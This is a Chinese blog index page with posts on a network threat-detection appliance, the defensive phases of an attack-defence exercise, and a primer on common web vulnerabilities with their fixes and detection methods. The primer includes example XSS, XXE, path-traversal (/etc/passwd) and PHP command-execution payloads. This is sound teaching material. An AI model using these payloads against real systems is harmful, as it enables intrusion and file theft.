<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="选择有时候比努力更重要">
<meta property="og:type" content="website">
<meta property="og:title" content="t2ee的博客">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="t2ee的博客">
<meta property="og:description" content="选择有时候比努力更重要">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="t2ee">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>t2ee的博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">t2ee的博客</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/25/%E5%85%A8%E6%B5%81%E9%87%8F%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E8%AE%BE%E5%A4%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/%E5%85%A8%E6%B5%81%E9%87%8F%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E8%AE%BE%E5%A4%87/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 17:01:30" itemprop="dateCreated datePublished" datetime="2021-05-25T17:01:30+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-21 22:44:22" itemprop="dateModified" datetime="2021-03-21T22:44:22+08:00">2021-03-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h1><p>基于网络流量和终端日志，运用威胁情报、规则、文件虚拟执行、机器学习等技术，发现网络中针对主机与服务器的已知高级网络攻击和未知的新型网络攻击的入侵行为，然后利用本地大数据平台对流量日志和终端日志进行存储和查询，结合威胁情报和攻击链分析对事件进行分析、研判和回溯，同时及时的阻断威胁。</p>
<h1 id="部署方案"><a href="#部署方案" class="headerlink" title="部署方案"></a>部署方案</h1><p>可以部署于企业网络的任何位置，对网络流量进行解析和记录，也可以通过在客户端部署的天擎终端安全管控产品，对客户端日志进行采集记录。同时天眼系统可分析本地采集到的所有信息，并结合来自威胁情报中心的威胁情报，快速发现企业内部的威胁。</p>
<h1 id="告警原理"><a href="#告警原理" class="headerlink" title="告警原理"></a>告警原理</h1><p>首选是天眼的流量传感器，对流经位置的流量进行采集，然后进行协议分析，将网络和终端的日志交给分析平台，把文件给文件威胁鉴定器，文件鉴定器鉴定完后，再把有关文件的网络和终端日志给分析平台。分析平台收集天擎，文件威胁鉴定器，流量传感器发来的日志，通过大数据平台进行鉴别，如有发现有大数据里存在的攻击手法，就会告警，否则需要人为判断。</p>
<h1 id="如何判断是否误报"><a href="#如何判断是否误报" class="headerlink" title="如何判断是否误报"></a>如何判断是否误报</h1><p>根据错误的告警，然后结合漏洞的原理，请求头响应的内容来分析是否误报</p>
<p><img src="http://test-123456-imgsubmit.oss-cn-beijing.aliyuncs.com/img/tianyan_1.jpg" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/25/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%B7%A5%E4%BD%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%B7%A5%E4%BD%9C/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 17:01:30" itemprop="dateCreated datePublished" datetime="2021-05-25T17:01:30+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-23 15:42:22" itemprop="dateModified" datetime="2021-03-23T15:42:22+08:00">2021-03-23</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="第一阶段：准备阶段"><a href="#第一阶段：准备阶段" class="headerlink" title="第一阶段：准备阶段"></a>第一阶段：准备阶段</h1><blockquote>
<p>准备阶段主要是组建队伍，明确演习流程和分工，进一步梳理本次参演系统的网络路径、数据流和相关资产信息，输出真实的网络拓扑和相关资产信息，整理并确定目标系统的网络安全专项应急预案</p>
</blockquote>
<h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><ul>
<li><p>明确本次演习防守工作的目的、工作分工、计划安排和基本工作流程</p>
</li>
<li><p>网络路径的梳理：</p>
<ol>
<li>明确系统访问资源（包括用户、设备或系统）的类型、位置和途径的网络节点</li>
<li>全面梳理目标系统可能被访问到的路径和数据流向，为后续有针对性的网络安全防护和监控点部署奠定基础</li>
</ol>
</li>
<li><p>关联及未知资产梳理</p>
<ol>
<li>梳理目标系统的关联及未知资产，形成目标系统的关联资产清单、未知资产清单</li>
<li>关联资产包括目标系统网络路径中的各个节点设备、节点设备同一区域的其它设备以及目标系统相关资产</li>
<li>未知资产包括与目标系统可有关联但未记录在关联资产清单里的资产</li>
</ol>
</li>
<li><p>专项紧急预案的确认</p>
<ol>
<li>确定应急预案的流程、措施有效，针对应急预案的组织、技术、管理流程内容进行完善，确保能够有效支撑后续演习工作</li>
</ol>
</li>
<li><p>加强安全监测防御体系</p>
<ol>
<li>梳理当前已有的安全监测和防御产品，对其实现的功能和防御范围进行确定</li>
</ol>
</li>
</ul>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>充分做好准备阶段工作，为后续演练工作其他阶段提供有效的支撑。</p>
<h1 id="第二阶段：安全自查和整改阶段"><a href="#第二阶段：安全自查和整改阶段" class="headerlink" title="第二阶段：安全自查和整改阶段"></a>第二阶段：安全自查和整改阶段</h1><h2 id="内容-1"><a href="#内容-1" class="headerlink" title="内容"></a>内容</h2><ul>
<li>根据准备阶段形成的目标系统关联资产清单、未知资产清单，对与组成目标系统相关的网络设备、服务器、中间件、数据库、应用系统、安全设备等开展安全自查和整改工作。</li>
<li>网络安全检查</li>
<li>主机安全检查</li>
<li>应用系统检查</li>
<li>运维终端检查</li>
<li>日志审计</li>
<li>备份效益检查</li>
<li>安全意识培训</li>
</ul>
<h2 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h2><p>通过安全自查对目标系统的安全状况得以真实反映，结合整改加固手段对评估发现的问题逐一整改。确保目标系统在攻防预演习前所有的安全问题均已采取措施得到处理</p>
<h1 id="第三阶段：攻防预演习阶段"><a href="#第三阶段：攻防预演习阶段" class="headerlink" title="第三阶段：攻防预演习阶段"></a>第三阶段：攻防预演习阶段</h1><h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><ul>
<li><p>攻防预演习阶段，由预演攻击小组，采用专业的攻防演习平台，对目标系统进行实战攻击，防护工作小组牵头防守方工作，实施对抗并进行安全防护。</p>
</li>
<li><p>演习工作小组针对攻防预演习中发现的问题进一步梳理、整改、加固和完善，更深一步分析问题的主要原因，提供杜绝问题再现的有效解决方案和整改措施，同时通过攻防预演习发现的问题逆向推导，以改进和完善安全自查和整改阶段的工作。</p>
</li>
<li><p>攻击手段</p>
<ol>
<li>web渗透</li>
<li>旁路渗透</li>
<li>钓鱼欺骗</li>
<li>社会工程学</li>
<li></li>
</ol>
</li>
</ul>
<h2 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h2><p>通过攻防预演习结果，及时发现目标系统还存在的安全风险，并对遗留（漏）风险进行分析和整改，确保目标系统在正式演习时，所有发现的安全问题均已得到有效的整改和处置</p>
<h1 id="第四阶段：正式演习防护阶段"><a href="#第四阶段：正式演习防护阶段" class="headerlink" title="第四阶段：正式演习防护阶段"></a>第四阶段：正式演习防护阶段</h1><h2 id="内容：-1"><a href="#内容：-1" class="headerlink" title="内容："></a>内容：</h2><p>正式演习防护阶段，要确保防护人员能够持续对网络攻击进行实时监测，并及时进行响应处置，针对演习中发现的漏洞和弱点，能及时进行修补和加固，积极应对，协同进行安全处置。演习结束后全面总结本次攻防演习工作情况，对于发现的问题和短板及时进行归纳整改和弥补，总结有效应对的措施和协同处置的规范流程。</p>
<h2 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h2><p>对于发现的问题和短板及时进行归纳整改和弥补，总结有效应对的措施和协同处置的规范流程。</p>
<p> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/25/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 17:01:30" itemprop="dateCreated datePublished" datetime="2021-05-25T17:01:30+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-24 16:25:35" itemprop="dateModified" datetime="2021-03-24T16:25:35+08:00">2021-03-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>将<strong>SQL语句</strong>插入或添加到应用（用户）的<strong>输入参数</strong>中，再将这些参数传递给后台的SQL服务器加以解析并执行。</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>网页篡改：通过操作数据库对特定网页进行篡改。<br>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>破坏硬盘数据，瘫痪全系统。</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>（1）Union注入<br>（2）盲注 //分为延时盲注和布尔盲注<br>（3）报错注入<br>（4）堆叠查询<br>（5）宽字节注入<br>（6）HTTP参数污染注入</p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>SQL语句预编译<br>针对SQL输入内容进行限制、过滤 //目前使用WAF对这一块进行处理<br>针对提交的关键数据进行转义 ，比如\select<br>关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等<br>数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作<br>敏感信息严格加密处理</p>
<h2 id="攻击检测方法"><a href="#攻击检测方法" class="headerlink" title="攻击检测方法"></a>攻击检测方法</h2><p>可以通过burpsuite抓包，看看请求是否有敏感的sql语句</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击者往Web页面里插入恶意html标签或者javascript代码。<br>分别是反射型XSS、持久型XSS和DOM XSS</p>
<h2 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h2><p>（1）网络钓鱼，盗取各类用户的账号<br>（2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作<br>（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等<br>（4）强制弹出广告页面，刷流量等<br>（5）进行恶意操作，例如任意篡改页面信息，删除文章等，传播跨站脚本蠕虫，网页挂等<br>（6）进行基于大量的客户端攻击，如DDOS攻击<br>（7）结合其它漏洞，如CSRF漏洞。</p>
<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
<li>反射型XSS攻击</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.xxx/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>存储型XSS攻击</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其目的在于利用图片报错信息来嵌入一段XSS代码，达到持久化的作用。</span><br><span class="line">&lt;img src=1 oneerror=alert(/test_xss_stored/)&gt;</span><br></pre></td></tr></table></figure>



<h2 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h2><p>（1）代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”,”&gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。<br>（2）避免直接在cookie 中泄露用户隐私，例如email、密码等等。<br>（3）通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。<br>（4）尽量采用POST 而非GET 提交表单</p>
<h2 id="攻击检测方法-1"><a href="#攻击检测方法-1" class="headerlink" title="攻击检测方法"></a>攻击检测方法</h2><p>流量分析，也可以从浏览器的请求中查看一些敏感的标签，是否存在script标签等</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>CSRF是一种夹持用户在已经登陆的web应用程序上执行非本意的操作的攻击方式。相比于XSS，CSRF是利用了系统对页面浏览器的信任，XSS则利用了系统对用户的信任。</p>
<h2 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h2><p>以受害者名义发送邮件，发消息，盗取受害者的账号，甚至购买商品，虚拟货币转账，修改受害者的网络配置（比如修改路由器DNS、重置路由器密码）等等。。造成的问题包括：个人隐私泄露、机密资料泄露、用户甚至企业的财产安全；一句话概括CSRF的危害：盗用受害者身份，受害者能做什么，攻击者就能以受害者的身份做什么。</p>
<h2 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h2><p>攻击者知道重要操作的所有参数）当A用户使用浏览器访问一个带有csrf漏洞的网站时，并且产生了cookie值存储在浏览器中，在用户A不退出网站的前提下，这时候访问用户B（攻击者）构造的的恶意链接，使其服务器以为是用户A的合理请求以达到攻击者想要的请求。</p>
<h2 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h2><p>（1） GET、POST的正确使用<br>（2） 利用验证码（在一定的情况下使用，但是为了防止客户产生不好印象，尽量不用）<br>（3） 验证HTTP Refer字段，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。但服务器并非任何时候都能取到referer、保护客户隐私，不作为预防主要手段)<br>（4） Anti CSRF Token：为每一个表单生成一个随机数秘钥，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
<h2 id="攻击检测方法-2"><a href="#攻击检测方法-2" class="headerlink" title="攻击检测方法"></a>攻击检测方法</h2><p>查看对方ip是否发送大量邮件</p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃</p>
<p>取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻</p>
<p>击。</p>
<blockquote>
<p><strong>XML用于标识电子文件使其具有结构性的标识语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声名、DTD文档类型定义、文档元素。</strong></p>
</blockquote>
<h2 id="危害-3"><a href="#危害-3" class="headerlink" title="危害"></a>危害</h2><p>XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</p>
<h2 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h2><p>通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"> </span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080&quot; &gt;]&gt;//内网端口的探测</span><br><span class="line">//&lt;!ENTITY xxe SYSTEM=&quot;file:///etc/passwd&quot;]&gt; 利用file://、php://等伪协议读取本地文件</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">   &lt;core id=&quot;test101&quot;&gt;</span><br><span class="line">      &lt;author&gt;John, Doe&lt;/author&gt;</span><br><span class="line">      &lt;title&gt;I love XML&lt;/title&gt;</span><br><span class="line">      &lt;category&gt;Computers&lt;/category&gt;</span><br><span class="line">      &lt;price&gt;9.99&lt;/price&gt;</span><br><span class="line">      &lt;date&gt;2018-10-01&lt;/date&gt;</span><br><span class="line">      &lt;description&gt;&amp;xxe;&lt;/description&gt;</span><br><span class="line">   &lt;/core&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
<li><p>使用开发语言提供的禁用外部实体的方法。</p>
</li>
<li><p>过滤用户提交的XML数据。</p>
</li>
<li><p>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。</p>
</li>
</ul>
<h2 id="攻击检测方法-3"><a href="#攻击检测方法-3" class="headerlink" title="攻击检测方法"></a>攻击检测方法</h2><p>查看是否又xxe的敏感信息，比如：</p>
<?xml version="1.0"?>

<!ENTITY xxe SYSTEM="file:///etc/passwd"]><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。</p>
<h2 id="危害-4"><a href="#危害-4" class="headerlink" title="危害"></a>危害</h2><p>如果 Web应用程序存在上传漏洞，攻击者上传的文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行<br>攻击者可以直接上传一个webshell到服务器上 完全控制系统或致使系统瘫痪。</p>
<h2 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h2><p>文件名大小写绕过，例如Php，AsP等类似的文件名</p>
<p>后缀名字双写嵌套，例如pphphp，asaspp等</p>
<p>可以利用系统会对一些特殊文件名做默认修改的系统特性绕过</p>
<p>可以利用asp程序中的漏洞，使用截断字符绕过</p>
<h2 id="修复方案-4"><a href="#修复方案-4" class="headerlink" title="修复方案"></a>修复方案</h2><p>上传文件的存储目录禁用执行权限</p>
<p>文件的后缀白名单，注意0x00截断攻击</p>
<p>使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件；</p>
<h2 id="攻击检测方法-4"><a href="#攻击检测方法-4" class="headerlink" title="攻击检测方法"></a>攻击检测方法</h2><p>查看文件的后缀名是否存在截断攻击</p>
<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p>由于一些网站的业务需要,往往需要提供文件读取或下载的一个模块,但如果没有对读取或下载做一个白名单或者限制，可能导致恶意攻击者读取下载一些敏感信息(etc/passwd 等),对服务器做下一步的进攻与威胁。</p>
<h2 id="危害-5"><a href="#危害-5" class="headerlink" title="危害"></a>危害</h2><p>通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等。</p>
<h2 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h2><p>漏洞验证：</p>
<ul>
<li><p>index.php?f=<code>../../../../../../etc/passwd</code></p>
</li>
<li><p>index.php?f=<code>../index.php</code></p>
</li>
<li><p>index.php?f=<code>ﬁle:///etc/passwd</code></p>
</li>
</ul>
<blockquote>
<p>【区分】当参数f的参数值为php文件时，若是文件被解析则是<strong>文件包含漏洞</strong>，若显示源码或提示下载则是<strong>文件查看与下载漏洞</strong>。</p>
</blockquote>
<h2 id="修复方案-5"><a href="#修复方案-5" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
<li>过滤<code>.</code>(点)，使用户在url中不能回溯上级目录；</li>
<li>正则严格判断用户输入参数的格式；</li>
<li>php.ini配置open_basedir限定文件访问范围。</li>
</ul>
<h2 id="攻击检测方法-5"><a href="#攻击检测方法-5" class="headerlink" title="攻击检测方法"></a>攻击检测方法</h2><p>查看路径是否下载某些敏感信息，比如一些日志文件，或者配置文件</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>在进行文件包含的时候,没有对参数进行严格的过滤</p>
<h2 id="危害-6"><a href="#危害-6" class="headerlink" title="危害"></a>危害</h2><p>本地包含:可以进行一些本地的文件读取 </p>
<p>远程包含:可以对外网上的文件进行读取</p>
<h2 id="利用方式-6"><a href="#利用方式-6" class="headerlink" title="利用方式"></a>利用方式</h2><p>file://伪协议 （读取文件内容）<br>通过file协议可以访问本地文件系统，读取到文件的内容</p>
<p>php://input(读取post数据)<br>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据</p>
<p>php://input（命令执行）</p>
<p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行</p>
<p><code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
